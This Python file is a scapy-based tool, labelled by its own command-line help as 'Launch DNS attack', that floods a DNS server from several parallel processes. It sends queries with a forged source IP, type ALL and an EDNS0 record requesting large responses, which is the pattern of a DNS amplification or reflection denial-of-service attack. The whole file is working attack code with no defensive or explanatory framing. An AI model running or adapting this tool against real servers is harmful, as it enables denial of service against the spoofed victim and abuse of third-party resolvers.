import argparse
from scapy.all import *
import time
import multiprocessing

lock = multiprocessing.Lock()

def sendQuery(dnsSource, dnsDestination, queryName, duration, packetNumber, use_dnssec):
    queryType = "ALL"
    endTime = time.time() + duration

    while time.time() < endTime:
        with lock:
            packetNumber.value += 1
            currentPacketNumber = packetNumber.value

        dnsQuery = IP(src=dnsSource, dst=dnsDestination) / UDP(sport=RandShort(), dport=53) / DNS(id=currentPacketNumber, rd=1, qd=DNSQR(qname=queryName, qtype=queryType))

        if use_dnssec:
            dnsQuery[DNS].cd = 1
            dnsQuery[DNS].qr = 0
            dnsQuery[DNS].ar = DNSRROPT(rclass=8192)
        else:
            dnsQuery[DNS].cd = 0
            dnsQuery[DNS].qr = 0
            dnsQuery[DNS].ar = DNSRROPT(rclass=8192)

        try:
            send(dnsQuery, verbose=0)
        except Exception as e:
            print(f"An exception occurred: {e}\n")


def sendQueries(dnsSource, dnsDestination, queryName, duration, numProcesses, use_dnssec):
    """
    Send DNS queries to a DNS server
    :param dnsSource: Source IP
    :param dnsDestination: Destination IP
    :param queryName: Query name
    :param duration: Duration in seconds
    :param numProcesses: Number of processes
    :param use_dnssec: Use DNSSEC if True
    """
    packetNumber = multiprocessing.Value('i', 0)
    processes = []

    for i in range(numProcesses):
        process = multiprocessing.Process(target=sendQuery, args=(dnsSource, dnsDestination, queryName, duration, packetNumber, use_dnssec))
        processes.append(process)

    for process in processes:
        process.start()

    for process in processes:
        process.join()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launch DNS attack')
    parser.add_argument('-s', '--dnsSource', type=str, help='Source IP')
    parser.add_argument('-d', '--dnsDestination', type=str, help='Destination IP')
    parser.add_argument('-q', '--queryName', type=str, help='Query name')
    parser.add_argument('-t', '--duration', type=int, help='Duration in seconds')
    parser.add_argument('-n', '--numProcesses', type=int, default=1, help='Number of processes')
    parser.add_argument('--dnssec', action='store_true', help='Use DNSSEC')

    args = parser.parse_args()
    sendQueries(args.dnsSource, args.dnsDestination, args.queryName, args.duration, args.numProcesses, args.dnssec)